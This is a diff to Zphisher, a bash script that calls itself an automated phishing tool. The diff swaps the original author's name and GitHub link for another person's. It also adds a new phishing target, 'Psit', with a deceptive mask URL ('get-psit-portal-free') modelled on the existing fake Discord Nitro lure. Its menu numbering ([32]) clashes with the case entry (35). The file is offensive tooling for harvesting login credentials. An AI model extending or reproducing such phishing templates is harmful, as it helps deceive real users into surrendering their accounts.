@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	Prince Katiyar 
 ##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
+##   Github 	: 	https://github.com/LxaNce-Hacker
 
 ##   THANKS TO :
 ##   Aditya Shakya - https://github.com/adi1090x
@@ -620,7 +620,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord	${RED}[${WHITE}32${RED}]${ORANGE} Psit
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -756,6 +756,10 @@ main_menu() {
 		34)
 			website="discord"
 			mask='http://get-discord-nitro-free'
+			tunnel_menu;;
+		35)
+			website="psit"
+			mask='http://get-psit-portal-free'
 			tunnel_menu;;
 		99)
 			about;;
